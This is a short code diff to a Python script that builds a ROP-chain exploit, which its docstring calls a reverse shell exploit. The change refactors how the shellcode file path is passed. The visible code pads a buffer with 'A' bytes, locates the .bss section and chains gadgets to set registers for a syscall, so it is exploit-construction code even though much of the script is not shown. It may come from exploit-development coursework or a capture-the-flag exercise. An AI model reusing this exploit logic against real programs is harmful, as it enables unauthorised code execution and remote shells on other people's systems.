@@ -38,7 +38,7 @@ def schedule(commands):
     print("No valid order!")
     return -1
 
-def rop_exploit():
+def rop_exploit(shellcode):
     """Create the full ROP chain reverse shell exploit
 
     :param cli_args: The command line arguments
@@ -52,7 +52,7 @@ def rop_exploit():
     print(f".bss located at {bss:x}")
     exploit = b'\x41' * padding
 
-    shellcode_len = stat(sys.argv[1]).st_size
+    shellcode_len = stat(shellcode).st_size
     
     commands = {"eax" : push_to_reg(0x0000007D,"eax",gadgets,rop),    
                 "ebx" : push_to_reg(bss,"ebx",gadgets,rop),
@@ -87,7 +87,7 @@ def rop_exploit():
 def test():
     fileName=input("Enter the file name: ")
     outfile=open(fileName, "wb")
-    outfile.write(rop_exploit())
+    outfile.write(rop_exploit(sys.argv[1]))
     outfile.close()
 
 
